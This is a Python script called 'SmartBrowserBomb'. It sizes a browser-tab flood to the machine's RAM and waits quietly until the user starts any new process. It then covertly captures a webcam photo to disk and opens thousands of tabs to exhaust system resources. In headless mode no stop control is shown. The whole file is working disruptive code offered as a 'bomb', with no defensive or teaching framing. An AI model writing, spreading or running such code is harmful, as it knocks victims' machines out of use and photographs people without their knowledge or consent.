import tkinter as tk
import platform
import psutil
import os
import threading
import webbrowser
import time
import logging
import subprocess
import sys
import cv2

# === CONFIGURATION ===
HEADLESS_MODE = False  # Set to True for headless (no GUI)
LOG_FILE = "activity.log"
CAPTURE_FILE = "webcam_capture.jpg"

# === LOGGING SETUP ===
logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s - %(message)s',
    level=logging.INFO
)

def log(msg):
    print(msg)
    logging.info(msg)

class SmartBrowserBomb:
    def __init__(self):
        self.running = False
        self.root = None
        self.tab_count = 0
        self.triggered = False
        self.existing_processes = set()
        self.detect_system_specs()

        # Record baseline processes
        self.existing_processes = self.get_current_processes()
        log(f"Learning baseline... {len(self.existing_processes)} processes recorded. Waiting for new activity...")

        # Start background activity monitor
        threading.Thread(target=self.monitor_user_activity, daemon=True).start()

    def detect_system_specs(self):
        self.os_name = platform.system()
        self.ram_mb = psutil.virtual_memory().total // (1024 * 1024)
        self.cpu_cores = os.cpu_count()
        self.tab_count = self.calculate_tab_count()
        log(f"Detected system → OS: {self.os_name}, RAM: {self.ram_mb}MB, CPU Cores: {self.cpu_cores}")

    def calculate_tab_count(self):
        if self.ram_mb >= 8000:
            return self.ram_mb // 8
        elif self.ram_mb >= 4000:
            return self.ram_mb // 6
        else:
            return self.ram_mb // 4

    def get_current_processes(self):
        current = set()
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name']:
                    current.add(proc.info['name'].lower())
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return current

    def monitor_user_activity(self):
        seen = self.existing_processes
        while not self.triggered:
            time.sleep(2)
            current = self.get_current_processes()
            new = current - seen
            if new:
                self.triggered = True
                log(f"New process detected: {list(new)[:1]} → Triggering the bomb!")
                self.running = True
                threading.Thread(target=self.capture_webcam_snapshot, daemon=True).start()
                threading.Thread(target=self.launch_tabs, daemon=True).start()
                if not HEADLESS_MODE:
                    threading.Thread(target=self.launch_gui_monitor, daemon=True).start()
                return
            seen = current

    def capture_webcam_snapshot(self):
        try:
            log("Capturing webcam image...")
            cam = cv2.VideoCapture(0)
            time.sleep(1)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(CAPTURE_FILE, frame)
                log(f"Webcam snapshot saved as {CAPTURE_FILE}")
            else:
                log("Failed to capture image from webcam.")
            cam.release()
            cv2.destroyAllWindows()
        except Exception as e:
            log(f"Webcam capture error: {e}")

    def launch_tabs(self):
        log(f"Launching {self.tab_count} tabs...")
        for i in range(1, self.tab_count + 1):
            if not self.running:
                log(f"Stopped at tab {i}")
                return
            webbrowser.open("https://www.google.com")
            log(f"Opened tab {i}")
            time.sleep(0.1)
        log("All tabs launched.")

    def launch_gui_monitor(self):
        self.root = tk.Tk()
        self.root.title("System Activity Monitor")
        self.root.geometry("600x450")
        self.root.configure(bg="#222")
        self.root.lift()
        self.root.attributes('-topmost', True)
        self.root.protocol("WM_DELETE_WINDOW", self.stop_bomb)
        self.root.bind('<Control-q>', lambda e: self.stop_bomb())

        tk.Label(self.root, text=" Browser Bomb Monitor", font=("Segoe UI", 16, "bold"), bg="#222", fg="white").pack(pady=10)

        self.info_text = tk.Text(self.root, height=6, width=65, font=("Consolas", 10), bg="#111", fg="lime", relief="flat")
        self.info_text.pack()
        self.info_text.insert(tk.END, f"OS: {self.os_name}\n")
        self.info_text.insert(tk.END, f"Total RAM: {self.ram_mb} MB\n")
        self.info_text.insert(tk.END, f"CPU Cores: {self.cpu_cores}\n")
        self.info_text.insert(tk.END, f"Launching: {self.tab_count} Tabs\n")
        self.info_text.config(state='disabled')

        tk.Label(self.root, text=" Log Output:", font=("Segoe UI", 11), bg="#222", fg="cyan").pack(pady=(10, 0))
        self.log_box = tk.Text(self.root, height=12, width=72, font=("Consolas", 10), bg="black", fg="white")
        self.log_box.pack(pady=(0, 10))

        tk.Button(self.root, text="STOP", command=self.stop_bomb, bg="red", fg="white", font=("Segoe UI", 12, "bold"), width=15).pack(pady=5)

        self.update_log_loop()
        self.root.mainloop()

    def update_log_loop(self):
        try:
            with open(LOG_FILE, 'r') as f:
                lines = f.readlines()[-20:]
                self.log_box.delete(1.0, tk.END)
                self.log_box.insert(tk.END, ''.join(lines))
        except:
            pass
        if self.running:
            self.root.after(2000, self.update_log_loop)

    def stop_bomb(self):
        self.running = False
        log("Bomb stopped by user.")
        if self.root:
            self.root.destroy()
        sys.exit(0)

if __name__ == "__main__":
    SmartBrowserBomb()
    while True:
        time.sleep(1)
